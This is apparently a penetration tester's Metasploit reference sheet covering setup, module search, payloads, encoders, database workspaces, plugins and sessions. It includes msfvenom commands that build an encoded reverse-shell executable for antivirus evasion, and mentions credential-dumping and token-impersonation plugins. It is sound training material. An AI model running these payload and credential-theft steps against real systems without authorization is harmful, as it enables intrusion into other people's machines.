# Metasploit Basics

## MSFDB

```bash
sudo msfdb init
sudo msfdb start
sudo msfdb status
sudo msfdb stop
sudo msfdb run        # start db + launch msfconsole
sudo msfdb reinit     # reinitialize if issues arise
```

If reinitializing:

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

Verify connection inside msfconsole:

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

---

## Installing / Updating

```bash
sudo apt update && sudo apt install metasploit-framework
```

---

## Launching MSFconsole

```bash
msfconsole        # with banner
msfconsole -q     # quiet (no banner)
```

---

## Architecture

Default install directory: `/usr/share/metasploit-framework`

| Directory | Purpose |
|---|---|
| `data/` | Editable files used by modules (wordlists, binaries, templates) |
| `documentation/` | Technical documentation for the project |
| `lib/` | Core framework library code |
| `modules/` | All exploit, auxiliary, post, payload, encoder, evasion, and nop modules |
| `plugins/` | Plugins for extending msfconsole |
| `scripts/` | Meterpreter and resource scripts |
| `tools/` | CLI utilities callable from msfconsole |

User-specific files are symlinked to `~/.msf4/`.

---

## Module Types

| Type | Description |
|---|---|
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities |
| `Encoders` | Ensure payloads are intact to their destination (bad char removal, basic evasion) |
| `Exploits` | Modules that exploit a vulnerability to allow payload delivery |
| `NOPs` | No Operation code — keep payload sizes consistent across exploit attempts |
| `Payloads` | Code that runs remotely to establish a connection back to the attacker |
| `Plugins` | Additional scripts integrated with msfconsole via the API |
| `Post` | Post-exploitation modules for gathering information, pivoting, etc. |
| `Evasion` | Modules specifically designed for AV/IDS evasion |

Interactable modules (usable with `use`): **Auxiliary**, **Exploits**, **Post**.

---

## Module Naming Convention

```
<No.> <type>/<os>/<service>/<name>
```

Example:

```
794  exploit/windows/ftp/scriptftp_list
```

---

## Searching for Modules

```
search [keywords]
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search eternalromance type:exploit
```

### Search Keywords

| Keyword | Description |
|---|---|
| `type` | Module type (exploit, payload, auxiliary, encoder, evasion, post, nop) |
| `platform` | Target platform (windows, linux, etc.) |
| `cve` | CVE ID |
| `rank` | Reliability rank (excellent, great, good, normal, average, low, manual) |
| `name` | Descriptive name pattern |
| `author` | Module author |
| `port` | Matching port |
| `edb` | Exploit-DB ID |
| `check` | Modules supporting the `check` method |
| `path` | Module path pattern |
| `fullname` | Full module name |

### Search Options

```
-S <string>    # Regex filter on results
-u             # Use module if only one result
-s <column>    # Sort by column (rank, date, name, type, check)
-r             # Reverse sort order
-o <file>      # Output to CSV file
```

### Grep Inside MSFconsole

Filter any command output with `grep`:

```
msf6 > grep meterpreter show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
msf6 > grep -c meterpreter show payloads       # count results
```

---

## Using Modules

```
use <module_path>
use 0                          # select by index number from search results
show options                   # view required/optional settings
set <option> <value>           # set option for current module
setg <option> <value>          # set option globally (persists across modules)
unset <option>                 # clear an option
info                           # detailed module information
check                          # test if target is vulnerable (if supported)
run                            # execute the module
exploit                        # alias for run
exploit -j                     # run as background job
```

---

## Targets

View available targets for the selected exploit:

```
show targets
set target <id>
```

Leaving target as `Automatic` lets msfconsole auto-detect the appropriate target via service detection.

---

## Payload Types

### Singles

Self-contained payloads with the exploit and entire shellcode in one. More stable, but larger. Can be caught with non-Metasploit handlers (e.g., `netcat`).

Naming: `<target>/<single>` — e.g., `windows/shell_bind_tcp`

### Stagers

Small, reliable payloads that set up a communication channel between victim and attacker, then download the stage. Common stagers: `reverse_tcp`, `bind_tcp`, `reverse_https`.

### Stages

Payload components downloaded by stagers. Provide advanced features with no size limits (e.g., Meterpreter, VNC Injection).

Naming: `<target>/<stage>/<stager>` — e.g., `windows/meterpreter/reverse_tcp`

### Searching and Selecting Payloads

```
show payloads                                          # list compatible payloads
grep meterpreter grep reverse_tcp show payloads        # filter
set payload <no.>                                      # select payload by index
set payload windows/x64/meterpreter/reverse_tcp        # select by full path
```

### Common Windows Payloads

| Payload | Description |
|---|---|
| `generic/custom` | Generic listener, multi-use |
| `generic/shell_bind_tcp` | Generic listener, normal shell, TCP bind |
| `generic/shell_reverse_tcp` | Generic listener, normal shell, reverse TCP |
| `windows/x64/exec` | Execute an arbitrary command (x64) |
| `windows/x64/loadlibrary` | Load an arbitrary x64 library path |
| `windows/x64/messagebox` | Spawn a dialog via MessageBox |
| `windows/x64/shell_reverse_tcp` | Normal shell, single payload, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Normal shell, stager + stage, reverse TCP |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 bind TCP |
| `windows/x64/meterpreter/$` | Meterpreter payload + connection variants |
| `windows/x64/powershell/$` | Interactive PowerShell sessions + variants |
| `windows/x64/vncinject/$` | VNC Server (Reflective Injection) + variants |

---

## Encoders

Encoders change payload encoding for architecture compatibility and bad character removal. They can also add a layer of AV evasion, though modern detection methods have largely caught up.

### Selecting Encoders

```
show encoders                   # list compatible encoders for current module + payload
```

Common encoders:

| Encoder | Rank | Description |
|---|---|---|
| `x86/shikata_ga_nai` | excellent | Polymorphic XOR Additive Feedback Encoder |
| `x64/xor` | manual | XOR Encoder |
| `x64/xor_dynamic` | manual | Dynamic key XOR Encoder |
| `x64/zutto_dekiru` | manual | Zutto Dekiru |
| `x86/call4_dword_xor` | normal | Call+4 Dword XOR Encoder |
| `x86/fnstenv_mov` | normal | Variable-length Fnstenv/mov Dword XOR Encoder |

### Encoding with msfvenom

```bash
# Without explicit encoder (auto-selects based on -b bad chars)
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

# With explicit encoder and iterations
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
```

Multiple iterations of encoding increase size but do not guarantee AV evasion on modern systems.

### msf-virustotal

Analyze payloads against VirusTotal (requires free API key):

```bash
msf-virustotal -k <API_KEY> -f payload.exe
```

---

## Database

### Workspaces

Organize scan results by engagement, target network, or subnet:

```
workspace                       # list workspaces (* = active)
workspace <name>                # switch workspace
workspace -a <name>             # add workspace
workspace -d <name>             # delete workspace
workspace -D                    # delete all workspaces
workspace -r <old> <new>        # rename workspace
workspace -v                    # list verbosely
```

### Importing Scan Results

```
db_import Target.xml            # import Nmap XML, Nessus, etc.
```

### Running Nmap Inside MSFconsole

Results automatically stored in the database:

```
db_nmap -sV -sS 10.10.10.8
```

### Viewing Data

```
hosts                           # list all hosts
hosts -c address,os_name        # show specific columns
hosts -S "10.10.10"             # search/filter
hosts -R                        # set RHOSTS from results

services                        # list all services
services -p 445                 # filter by port
services -s http                # filter by service name
services -u                     # only show services that are up
services -R                     # set RHOSTS from results

creds                           # list all credentials
creds -u admin                  # filter by user
creds -t ntlm                   # filter by type
creds add user:admin password:pass123 realm:WORKGROUP

loot                            # list all loot (hashes, passwd, shadow, etc.)
```

### Exporting Data

```
db_export -f xml backup.xml
db_export -f pwdump backup.pwdump
```

---

## Plugins

Default plugin directory: `/usr/share/metasploit-framework/plugins`

### Loading Plugins

```
load nessus
load pentest
load <plugin_name>
```

### Installing Custom Plugins

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

Then in msfconsole: `load pentest`

### Popular Plugins

| Plugin | Description |
|---|---|
| Nessus (pre-installed) | Vulnerability scanner integration |
| Nexpose (pre-installed) | Vulnerability scanner integration |
| Mimikatz/Kiwi (pre-installed) | Credential dumping (Kiwi replaced Mimikatz in MSF6) |
| Stdapi (pre-installed) | Standard API extension for Meterpreter |
| Incognito (pre-installed) | Token impersonation |
| Railgun | Direct Windows API calls from Meterpreter |
| Priv | Privilege escalation commands |
| DarkOperator's Pentest | Discovery, auto-exploit, multi-session post modules |

---

## Sessions

### Managing Sessions

```
sessions                        # list all active sessions
sessions -i <id>                # interact with a session
sessions -k <id>                # kill a session
sessions -K                     # kill all sessions
sessions -u <id>                # upgrade shell to meterpreter
```

Background a session: `[CTRL]+[Z]` or `background` from within Meterpreter.

### Jobs

Run exploits and handlers as background jobs:

```
exploit -j                      # run current exploit as background job
jobs -l                         # list all running jobs
jobs -i <id>                    # detailed job info
jobs -k <id>                    # kill a job
jobs -K                         # kill all jobs
```

---

## Writing and Importing Modules

### Finding Modules on ExploitDB

```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"      # filter for .rb only
```

### Installing a Custom Module

Copy the `.rb` file to the appropriate directory under `/usr/share/metasploit-framework/modules/` (mirroring the `<type>/<os>/<service>/` structure). Use snake_case and alphanumeric characters for filenames.

```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

### Loading the Module

```bash
msfconsole -m /usr/share/metasploit-framework/modules/   # load at startup
```

Or from within msfconsole:

```
loadpath /usr/share/metasploit-framework/modules/
reload_all
use exploit/unix/webapp/nagios3_command_injection
```

User modules can also be placed in `~/.msf4/modules/` following the same directory structure.
